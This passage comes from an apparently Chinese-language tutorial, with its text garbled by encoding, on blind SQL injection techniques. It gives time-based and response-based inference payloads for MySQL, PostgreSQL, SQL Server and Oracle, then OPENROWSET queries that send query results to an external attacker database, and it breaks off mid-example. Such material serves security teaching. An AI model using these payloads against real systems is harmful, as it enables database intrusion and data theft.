punctuation">.</span>aspx?test<span class="token operator">=</span>test<span class="token string">'OR 1 = CASE WHENSYS_CONTEXT('</span>USERENV<span class="token string">', '</span>ISDBA<span class="token string">') = '</span><span class="token boolean">TRUE</span><span class="token string">' THEN DBMS_PIPE.RECEIVE_ MESSAGE('</span>foo'<span class="token punctuation">,</span> <span class="token number">5</span><span class="token punctuation">)</span> <span class="token keyword">ELSE</span> <span class="token number">1</span> <span class="token keyword">END</span> <span class="token comment">-- </span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h4 id="åŸºäºæ—¶é—´çš„æ¨æ–­åº”è€ƒè™‘çš„é—®é¢˜"><a href="#åŸºäºæ—¶é—´çš„æ¨æ–­åº”è€ƒè™‘çš„é—®é¢˜" class="headerlink" title="åŸºäºæ—¶é—´çš„æ¨æ–­åº”è€ƒè™‘çš„é—®é¢˜"></a>åŸºäºæ—¶é—´çš„æ¨æ–­åº”è€ƒè™‘çš„é—®é¢˜</h4><p>å¦‚æœè¯·æ±‚å»¶è¿Ÿå¾ˆä¹…ï¼Œä¹Ÿå¯èƒ½æ˜¯è¿‡è½½è¿‡é«˜æˆ–è€…ä¿¡é“æ‹¥å µ</p><p>è§£å†³æ–¹æ³•</p><ol><li>å°†å»¶è¿Ÿå°½é‡è®¾ç½®é«˜äº›ä»¥æŠµæ¶ˆå…¶ä»–å»¶è¿Ÿ</li><li>å‘é€ä¸¤ä¸ªå‡ ä¹ç›¸åŒçš„è¯·æ±‚ï¼Œæ¯”è¾ƒä¸¤ä¸ªå»¶è¿Ÿï¼Œä¸€ä¸ªå¯èƒ½æ˜¯çŠ¶æ€ä¸º0çš„å»¶è¿Ÿï¼Œä¸€ä¸ªæ˜¯çŠ¶æ€ä¸º1çš„å»¶è¿Ÿï¼ŒåŠ ä»¥æ¨æ–­</li></ol><h3 id="ä½¿ç”¨åŸºäºå“åº”çš„è¯·æ±‚"><a href="#ä½¿ç”¨åŸºäºå“åº”çš„è¯·æ±‚" class="headerlink" title="ä½¿ç”¨åŸºäºå“åº”çš„è¯·æ±‚"></a>ä½¿ç”¨åŸºäºå“åº”çš„è¯·æ±‚</h3><p>æ¨æ–­çŠ¶æ€æ—¶ï¼Œå¯ä»¥å€ŸåŠ©å“åº”ä¸­åŒ…å«çš„æ–‡æœ¬æˆ–åœ¨æ£€æŸ¥ç‰¹å®šå€¼æ—¶å¼ºåˆ¶äº§ç”Ÿçš„é”™è¯¯ã€‚</p><h4 id="Mysqlå“åº”æŠ€æœ¯"><a href="#Mysqlå“åº”æŠ€æœ¯" class="headerlink" title="Mysqlå“åº”æŠ€æœ¯"></a>Mysqlå“åº”æŠ€æœ¯</h4><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">SELECT</span> <span class="token function">COUNT</span><span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">)</span> <span class="token keyword">FROM</span> reviews <span class="token keyword">WHERE</span> review_author<span class="token operator">=</span><span class="token string">'MadBob'</span><span class="token comment">#è¿”å›ä¸¤æ¡ç»“æœ</span><span class="token keyword">SELECT</span> <span class="token function">COUNT</span><span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">)</span> <span class="token keyword">FROM</span> reviews <span class="token keyword">WHERE</span> review_author<span class="token operator">=</span><span class="token string">'MadBob'</span> <span class="token operator">AND</span> ASCII<span class="token punctuation">(</span>SUBSTRING<span class="token punctuation">(</span><span class="token keyword">user</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span>i<span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">&amp;</span><span class="token number">2</span><span class="token operator">^</span>J<span class="token operator">=</span><span class="token number">2</span><span class="token operator">^</span>J<span class="token comment">#</span><span class="token comment">#å¦‚æœiä½ä¸º1ï¼Œæ¡ä»¶ä¸ºçœŸï¼Œè¿”å›ä¸Šé¢ç›¸åŒç»“æœï¼Œiä½ä¸º0åˆ™è¿”å›0æ¡</span><span class="token comment">#å¹³è¡¡æ‹†åˆ†æŠ€æœ¯</span><span class="token keyword">SELECT</span> <span class="token function">COUNT</span><span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">)</span> <span class="token keyword">FROM</span> reviews <span class="token keyword">WHERE</span> id<span class="token operator">=</span> <span class="token number">1</span><span class="token comment">#é€ä½æ–¹æ³•(bit-by-bit)çš„æ‹†åˆ†ä¸å¹³è¡¡æ³¨å…¥å­—ç¬¦ä¸²ä¸ºï¼š</span><span class="token keyword">SELECT</span> <span class="token function">COUNT</span><span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">)</span> <span class="token keyword">FROM</span> reviews <span class="token keyword">WHERE</span> id<span class="token operator">=</span><span class="token number">1</span><span class="token operator">+</span><span class="token keyword">if</span><span class="token punctuation">(</span>ASCII<span class="token punctuation">(</span>SUBSTRING<span class="token punctuation">(</span><span class="token keyword">CURRENT_USER</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span>i<span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">&amp;</span><span class="token number">2</span><span class="token operator">^</span>j<span class="token operator">=</span><span class="token number">2</span><span class="token operator">^</span>j<span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token comment">#æ— æ³•ä¿®æ”¹</span><span class="token keyword">SELECT</span> <span class="token function">COUNT</span><span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">)</span> <span class="token keyword">FROM</span> reviews <span class="token keyword">WHERE</span> id<span class="token operator">=</span><span class="token keyword">IF</span><span class="token punctuation">(</span>ASCII<span class="token punctuation">(</span>SUBSTRING<span class="token punctuation">(</span><span class="token keyword">CURRENT_USER</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span>i<span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">&amp;</span><span class="token number">2</span><span class="token operator">^</span>j<span class="token operator">=</span><span class="token number">2</span><span class="token operator">^</span>j<span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token keyword">SELECT</span> table_name <span class="token keyword">FROM</span> information_schema<span class="token punctuation">.</span><span class="token keyword">columns</span> <span class="token keyword">WHERE</span> table_name <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">SELECT</span> table_name <span class="token keyword">FROM</span> information_schema<span class="token punctuation">.</span><span class="token keyword">columns</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">#å¾ˆæ˜æ˜¾ï¼Œç¬¬äºŒä¸ªå­æŸ¥è¯¢è¿”å›å¤šè¡Œï¼Œè¿™å¥SQLä¼šæŠ¥é”™ï¼Œé‚£ä¹ˆå°±ä¼šæœ‰ä¸¤ç§çŠ¶æ€</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>ä½¿ç”¨ä»¥PHPç¼–å†™å¹¶ä»¥MySQLä½œä¸ºæ•°æ®å­˜å‚¨çš„åº”ç”¨æ—¶ï¼Œåœ¨æ•°æ®åº“æŸ¥è¯¢æ‰§è¡Œè¿‡ç¨‹ä¸­å‡ºç°çš„é”™è¯¯ä¸ä¼šäº§ç”Ÿå¼•å‘é€šç”¨é”™è¯¯é¡µé¢çš„å¼‚å¸¸ã€‚è°ƒç”¨é¡µé¢å¿…é¡»æ£€æŸ¥mysql_query()æ˜¯å¦è¿”å›FALSE,æˆ–è€…mysql_error()æ˜¯å¦è¿”å›ä¸€ä¸ªéç©ºå­—ç¬¦ä¸²ã€‚åªè¦æœ‰ä¸€ä¸ªæ¡ä»¶æˆç«‹ï¼Œé¡µé¢å°±ä¼šæ‰“å°ä¸€ä¸ªåº”ç”¨ä¸“ç”¨çš„é”™è¯¯æ¶ˆæ¯ã€‚è¿™æ ·åšçš„ç»“æœæ˜¯ï¼ŒMySQLé”™è¯¯ä¸ä¼šäº§ç”ŸHTTP 500å“åº”ä»£ç ï¼Œè€Œæ˜¯ äº§ç”Ÿæ­£å¸¸çš„200å“åº”ä»£ç ã€‚</p><h4 id="PostgreSQLå“åº”æŠ€æœ¯"><a href="#PostgreSQLå“åº”æŠ€æœ¯" class="headerlink" title="PostgreSQLå“åº”æŠ€æœ¯"></a>PostgreSQLå“åº”æŠ€æœ¯</h4><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">SELECT</span> <span class="token function">COUNT</span> <span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">)</span> <span class="token keyword">FROM</span> reviews <span class="token keyword">WHERE</span> review_author<span class="token operator">=</span><span class="token string">'MadBob'</span> <span class="token operator">AND</span> ASCII<span class="token punctuation">(</span>SUBSTRING<span class="token punctuation">(</span><span class="token keyword">user</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span>i<span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">&amp;</span><span class="token number">2</span><span class="token operator">^</span>j<span class="token operator">=</span><span class="token number">2</span><span class="token operator">^</span>j<span class="token comment">-- </span><span class="token keyword">SELECT</span> <span class="token function">COUNT</span> <span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">)</span> <span class="token keyword">FROM</span> reviews <span class="token keyword">WHERE</span> id<span class="token operator">=</span><span class="token number">1</span><span class="token operator">+</span><span class="token punctuation">(</span><span class="token keyword">SELECT</span> <span class="token keyword">CASE</span> <span class="token keyword">WHEN</span> <span class="token punctuation">(</span>ASCII<span class="token punctuation">(</span>SUBSTR<span class="token punctuation">(</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">,</span>i<span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">&amp;</span><span class="token number">2</span><span class="token operator">^</span>j<span class="token operator">=</span><span class="token number">2</span><span class="token operator">^</span>j<span class="token punctuation">)</span> <span class="token keyword">THEN</span> PAUSE <span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token keyword">ELSE</span> <span class="token number">0</span> <span class="token keyword">END</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">--    </span><span class="token comment">#pause()æ˜¯è‡ªå®šä¹‰çš„                                          </span><span class="token comment">#æ— æ³•ä¿®æ”¹å†…å®¹æ—¶ï¼Œå¼ºåˆ¶ä½¿ç”¨é™¤ä»¥0çš„æ¡ä»¶</span><span class="token keyword">SELECT</span> <span class="token keyword">CASE</span> <span class="token punctuation">(</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">)</span><span class="token keyword">WHEN</span> <span class="token boolean">TRUE</span> <span class="token keyword">THEN</span> <span class="token number">1</span><span class="token operator">/</span><span class="token number">0</span> <span class="token keyword">END</span><span class="token comment">#å¾ˆå®¹æ˜“å°†å®ƒå’Œæ‹†åˆ†ä¸å¹³è¡¡æŠ€æœ¯ç»“åˆä½¿ç”¨ï¼š</span><span class="token string">'||(SELECT CASE(...)WHEN TRUE THEN 1/0 END)||'</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="SQL-Serverå“åº”æŠ€æœ¯"><a href="#SQL-Serverå“åº”æŠ€æœ¯" class="headerlink" title="SQL Serverå“åº”æŠ€æœ¯"></a>SQL Serverå“åº”æŠ€æœ¯</h4><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">SELECT</span> <span class="token function">COUNT</span><span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">)</span> <span class="token keyword">FROM</span> reviews <span class="token keyword">WHERE</span> review_author<span class="token operator">=</span><span class="token string">'MadBob'</span> <span class="token operator">and</span> <span class="token keyword">SYSTEM_USER</span><span class="token operator">=</span><span class="token string">'sa'</span><span class="token keyword">SELECT</span> <span class="token function">COUNT</span><span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">)</span> <span class="token keyword">FROM</span> reviews <span class="token keyword">WHERE</span> review_author<span class="token operator">=</span><span class="token string">'MadBob'</span> <span class="token operator">AND</span> ASCII<span class="token punctuation">(</span>SUBSTRING<span class="token punctuation">(</span><span class="token keyword">SYSTEM_USER</span><span class="token punctuation">,</span>i<span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">&gt;</span>k <span class="token comment">-- </span><span class="token keyword">SELECT</span> <span class="token function">COUNT</span><span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">)</span> <span class="token keyword">FROM</span> reviews <span class="token keyword">WHERE</span> review_author<span class="token operator">=</span><span class="token string">'MadBob'</span> <span class="token operator">AND</span> ASCII<span class="token punctuation">(</span>SUBSTRING<span class="token punctuation">(</span><span class="token keyword">SYSTEM_USER</span><span class="token punctuation">,</span>i<span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">&amp;</span><span class="token number">2</span><span class="token operator">^</span>J<span class="token operator">=</span><span class="token number">2</span><span class="token operator">^</span>J<span class="token comment">#äºŒåˆ†æ³•</span><span class="token keyword">SELECT</span> <span class="token function">COUNT</span><span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">)</span> <span class="token keyword">FROM</span> reviews <span class="token keyword">WHERE</span> review_author<span class="token operator">=</span><span class="token string">'Mad'</span><span class="token operator">+</span><span class="token punctuation">(</span><span class="token keyword">SELECT</span> <span class="token keyword">CASE</span> <span class="token keyword">WHEN</span> ASCII<span class="token punctuation">(</span>SUBSTRING<span class="token punctuation">(</span><span class="token keyword">SYSTEM_USER</span><span class="token punctuation">,</span>i<span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">&gt;</span>k <span class="token keyword">THEN</span> <span class="token string">'Bob'</span> <span class="token keyword">END</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">''</span><span class="token comment">#ä¸‹é¢æ˜¯ç›¸åº”çš„ä½¿ç”¨é€ä½æ–¹æ³•çš„ä¾‹å­</span><span class="token keyword">SELECT</span> <span class="token function">COUNT</span><span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">)</span> <span class="token keyword">FROM</span> reviews <span class="token keyword">WHERE</span> review_author<span class="token operator">=</span><span class="token string">'Mad'</span> <span class="token operator">+</span> <span class="token punctuation">(</span><span class="token keyword">SELECT</span> <span class="token keyword">CASE</span> <span class="token keyword">WHEN</span> ASCII<span class="token punctuation">(</span>SUBSTRING<span class="token punctuation">(</span><span class="token keyword">SYSTEM_USER</span><span class="token punctuation">,</span>i<span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">&amp;</span><span class="token number">2</span><span class="token operator">^</span>j<span class="token operator">=</span><span class="token number">2</span><span class="token operator">^</span>j <span class="token keyword">THEN</span> <span class="token string">'Bob'</span> <span class="token keyword">END</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">''</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>å½“ASP.NETåº”ç”¨ç¨‹åºä½¿ç”¨web.configé…ç½®æ–‡ä»¶çš„ï¼œcustomErrorï¼æ ‡è®°å®šä¹‰çš„å‡ºé”™é¡µé¢(error page)æ¥æ•è·æœªå¤„ç†çš„å¼‚å¸¸æ—¶ï¼Œå¯ä»¥æ·»åŠ æˆ–ä¿®æ”¹ aspxerrorpageå‚æ•°ï¼Œä½¿å…¶æŒ‡å‘ä¸€ä¸ªå¹¶ä¸å­˜åœ¨çš„é¡µé¢ï¼Œè¿™æ ·å°±å¯ä»¥æ—è·¯(bypass)å‡ºé”™é¡µé¢ã€‚å› æ­¤ï¼Œå¦‚æœä¸‹é¢çš„è¯·æ±‚åœ¨åŠŸèƒ½ä¸Šé‡å®šå‘åˆ°ä¸€ä¸ªç”¨æˆ·è‡ªå®šä¹‰çš„å‡ºé”™é¡µé¢ï¼Œè¯·æ±‚å¸¸å¸¸ä¼šæ³„æ¼å®ƒæ‰€æ•è·çš„åº•å±‚é”™è¯¯:</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">count_reviews<span class="token punctuation">.</span>aspx?review_author<span class="token operator">=</span>MadBob'<span class="token operator">&amp;</span>aspxerrorpath<span class="token operator">=</span><span class="token operator">/</span>foo<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>è¯­æ³•ä¸Šä¸èƒ½å­˜åœ¨é”™è¯¯ï¼Œå› ä¸ºè¿™ä¼šå¯¼è‡´åœ¨æ‰§è¡ŒæŸ¥è¯¢ä¹‹å‰æ€»æ˜¯å¤±è´¥ï¼Œåª èƒ½é€šè¿‡æŸäº›æ¡ä»¶æ¥å¼•å‘æŸ¥è¯¢å¤±è´¥ã€‚å¯é€šè¿‡ç»“åˆä½¿ç”¨é™¤æ•°ä¸º0çš„å­å¥å’ŒCASEæ¡ä»¶æ¥å®ç°è¯¥ç›®çš„:</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">FROM</span> reviews <span class="token keyword">WHERE</span> review_author<span class="token operator">=</span><span class="token string">'MadBob'</span><span class="token operator">+</span><span class="token punctuation">(</span><span class="token keyword">CASE</span> <span class="token keyword">WHEN</span> ASCII<span class="token punctuation">(</span>SUBSTRING<span class="token punctuation">(</span><span class="token keyword">SYSTEM_USER</span><span class="token punctuation">,</span>i<span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">&gt;</span>k <span class="token keyword">THEN</span> CAST <span class="token punctuation">(</span><span class="token number">1</span><span class="token operator">/</span><span class="token number">0</span> <span class="token keyword">AS</span> <span class="token keyword">CHAR</span><span class="token punctuation">)</span> <span class="token keyword">END</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="Oracleå“åº”æŠ€æœ¯"><a href="#Oracleå“åº”æŠ€æœ¯" class="headerlink" title="Oracleå“åº”æŠ€æœ¯"></a>Oracleå“åº”æŠ€æœ¯</h4><p>ç»“æ„å’Œä¸Šè¿°æ•°æ®åº“ç›¸ä¼¼ï¼Œä¾èµ–çš„å‡½æ•°ä¸åŒ</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">SELECT</span> <span class="token operator">*</span> <span class="token keyword">FROM</span> reviews <span class="token keyword">WHERE</span> review_author<span class="token operator">=</span><span class="token string">'MadBob'</span> <span class="token operator">AND</span> SYS_CONTEXT<span class="token punctuation">(</span><span class="token string">'USE RENV'</span><span class="token punctuation">,</span><span class="token string">'ISDBA'</span><span class="token punctuation">)</span> <span class="token operator">=</span><span class="token string">'TRUE'</span>ï¼›<span class="token comment">#é€ä½æ¨æ–­ï¼Œæ ¹æ®ç¬¬äºŒä¸ªæ³¨å…¥è°“è¯æ˜¯å¦è¿”å›ç»“æœæ¥æµ‹è¯•çŠ¶æ€ï¼š</span><span class="token keyword">SELECT</span> <span class="token operator">*</span> <span class="token keyword">FROM</span> reviews <span class="token keyword">WHERE</span> review_author<span class="token operator">=</span><span class="token string">'MadBob'</span><span class="token operator">AND</span> BITAND<span class="token punctuation">(</span>ASCII<span class="token punctuation">(</span>SUBSTR<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">)</span><span class="token punctuation">,</span>i<span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token operator">^</span>j<span class="token punctuation">)</span><span class="token operator">=</span><span class="token number">2</span><span class="token operator">^</span>j<span class="token comment">#äºŒåˆ†æœç´¢</span><span class="token keyword">SELECT</span> <span class="token operator">*</span> <span class="token keyword">FROM</span> reviews <span class="token keyword">WHERE</span> review_author<span class="token operator">=</span><span class="token string">'MadBob'</span> <span class="token operator">AND</span> ASCII<span class="token punctuation">(</span>SUBSTR<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">)</span><span class="token punctuation">,</span>i<span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">&gt;</span>k<span class="token comment">#ä½¿ç”¨Oracleçš„å­—ç¬¦ä¸²è¿æ¥æŠ€æœ¯æ¥ç¡®ä¿åœ¨å‡½æ•°æˆ–è¿‡ç¨‹å‚æ•°åˆ—è¡¨ä¸­å®‰å…¨åœ°ä½¿ç”¨,è¯¥æŠ€æœ¯ä½¿ç”¨è¿æ¥å’ŒCASEè¯­å¥å°†åˆ©ç”¨é‡å†™ä¸ºæ‹†åˆ†ä¸å¹³è¡¡è¿‡çš„å­—ç¬¦ä¸²</span>Mad<span class="token string">'||(SELECT CASE WHEN (ASCII(SUBSTR((...),i,1))&gt;k THEN '</span>Bob<span class="token string">' ELSE '' END FROM DUAL)||'</span><span class="token punctuation">;</span><span class="token comment">#ä¸Šè¿°ä»£ç åªæœ‰åœ¨æ¨æ–­æµ‹è¯•è¿”å›çœŸæ—¶æ‰ä¼šäº§ç”Ÿå®Œæ•´çš„MadBobå­—ç¬¦ä¸²</span><span class="token comment">#ä½¿ç”¨é™¤æ•°ä¸º0å­å¥æ¥äº§ç”Ÿè¿è¡Œæ—¶é”™è¯¯ï¼Œè¿™ä¸SQL Serverä¸­çš„æ“ä½œç›¸ä¼¼</span>MadBob<span class="token string">'||(SELECT CASE WHEN BITAND((ASCII(SUBSTR((...),i,1))2^j)=2^j THEN CAST(1/0 AS CHAR) ELSE '' END FROM DUAL)||'</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="è¿”å›å¤šä½ä¿¡æ¯"><a href="#è¿”å›å¤šä½ä¿¡æ¯" class="headerlink" title="è¿”å›å¤šä½ä¿¡æ¯"></a>è¿”å›å¤šä½ä¿¡æ¯</h4><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token comment">#é€ä½</span><span class="token keyword">CASE</span><span class="token keyword">WHEN</span> ASCII<span class="token punctuation">(</span>SUBSTRING<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">)</span><span class="token punctuation">,</span>i<span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">&amp;</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token operator">^</span>j<span class="token operator">+</span><span class="token number">2</span><span class="token operator">^</span>j<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">=</span><span class="token number">0</span><span class="token keyword">THEN</span> <span class="token keyword">WAITFOR</span> DELAY <span class="token string">'00:00:00'</span><span class="token keyword">WHEN</span> ASCII<span class="token punctuation">(</span>SUBSTRING<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">)</span><span class="token punctuation">,</span>i<span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">&amp;</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token operator">^</span>j<span class="token operator">+</span><span class="token number">2</span><span class="token operator">^</span>j<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">=</span><span class="token number">2</span><span class="token operator">^</span>j<span class="token keyword">THEN</span> <span class="token keyword">WAITFOR</span> DELAY <span class="token string">'00:00:05'</span><span class="token keyword">WHEN</span> ASCII<span class="token punctuation">(</span>SUBSTRING<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">)</span><span class="token punctuation">,</span>i<span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">&amp;</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token operator">^</span>j<span class="token operator">+</span><span class="token number">2</span><span class="token operator">^</span>j<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">=</span><span class="token number">2</span><span class="token operator">^</span>j<span class="token operator">+</span><span class="token number">1</span><span class="token keyword">THEN</span> <span class="token keyword">WAITFOR</span> DELAY <span class="token string">'00:00:10'</span><span class="token keyword">ELSE</span><span class="token keyword">THEN</span> <span class="token keyword">WAITFOR</span> DELAY <span class="token string">'00:00:15'</span><span class="token keyword">END</span><span class="token comment">#äºŒåˆ†</span><span class="token keyword">CASE</span><span class="token keyword">WHEN</span> ASCII<span class="token punctuation">(</span>SUBSTRING<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">)</span><span class="token punctuation">,</span>i<span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">&gt;</span>k<span class="token keyword">THEN</span> <span class="token keyword">WAITFOR</span> DELAY <span class="token string">'00:00:05'</span><span class="token keyword">WHEN</span> ASCII<span class="token punctuation">(</span>SUBSTRING<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">)</span><span class="token punctuation">,</span>i<span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">=</span>k<span class="token keyword">THEN</span> <span class="token number">1</span><span class="token operator">/</span><span class="token number">0</span><span class="token keyword">ELSE</span><span class="token keyword">THEN</span> <span class="token keyword">WAITFOR</span> DELAY <span class="token string">'00:00:00'</span><span class="token keyword">END</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="ä½¿ç”¨éä¸»æµé€šé“"><a href="#ä½¿ç”¨éä¸»æµé€šé“" class="headerlink" title="ä½¿ç”¨éä¸»æµé€šé“"></a>ä½¿ç”¨éä¸»æµé€šé“</h3><p>æ•°æ®åº“è¿æ¥ã€DNSã€e-mailå’ŒHTTP</p><h4 id="æ•°æ®åº“è¿æ¥"><a href="#æ•°æ®åº“è¿æ¥" class="headerlink" title="æ•°æ®åº“è¿æ¥"></a>æ•°æ®åº“è¿æ¥</h4><p>é’ˆå¯¹mssqlï¼Œæ”»å‡»è€…å¯é€šè¿‡é€šé“æ¥åˆ›å»ºä»å—å®³è€…æ•°æ®åº“åˆ°æ”»å‡»è€…æ•°æ®åº“çš„è¿æ¥ï¼Œå¹¶é€šè¿‡è¯¥è¿æ¥ä¼ é€’æŸ¥è¯¢çš„æ•°æ®ã€‚å¯ä½¿ç”¨OPENROWSETå‘½ä»¤å®ç°è¯¥ç›®çš„ï¼Œè¦æƒ³æ”»å‡»æˆåŠŸï¼Œæ”»å‡»è€…å¿…é¡»èƒ½å¤Ÿåœ¨å—å®³è€…æ•°æ®åº“ä¸Šæ‰“å¼€ä¸€æ¡é€šå‘æ”»å‡»è€…æ•°æ®åº“çš„TCP(ä¼ è¾“æ§åˆ¶åè®®)è¿æ¥ï¼Œé»˜è®¤ä½¿ç”¨çš„æ˜¯1433ç«¯å£ã€‚å¦‚æœå—å®³è€…æœºå™¨ä¸Šé…æœ‰å‡ºå£è¿‡æ»¤åŠŸèƒ½ï¼Œæˆ–è€…æ”»å‡»è€…æ­£åœ¨æ‰§è¡Œå‡ºå£è¿‡æ»¤ï¼Œé‚£ä¹ˆè¿æ¥å°±ä¼šå¤±è´¥ã€‚åªéœ€ä¿®æ”¹ç›®çš„IPåœ°å€åé¢çš„ç«¯å£å·å³å¯è¿æ¥åˆ°å…¶ä»–ç«¯å£ã€‚</p><p>ç¤ºä¾‹ï¼šè¿æ¥åˆ°åœ°å€ä¸º10.0.2.2çš„mssqlç”¨æˆ·saå¹¶æ‰§è¡ŒSQLè¯­å¥</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">SELECT</span> <span class="token operator">*</span> <span class="token keyword">FROM</span> <span class="token keyword">OPENROWSET</span><span class="token punctuation">(</span><span class="token string">'SQLOLEDB'</span><span class="token punctuation">,</span><span class="token string">'Network=DBMSSOCN;Address=10.0.2.2;uid=sa;pwd=Mypassword'</span><span class="token punctuation">,</span><span class="token string">'SELECT review_author FROM reviews'</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>å‘å¤–éƒ¨æ•°æ®åº“ä¼ é€’æ•°æ®</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">INSERT</span> <span class="token keyword">INTO</span> <span class="token keyword">OPENROWSET</span><span class="token punctuation">(</span><span class="token string">'SQLOLEDB'</span><span class="token punctuation">,</span><span class="token string">'Network=DBMSOCN;Address=192.168.0.1;uid=foo;pwd=password'</span><span class="token punctuation">,</span><span class="token string">'SELECT 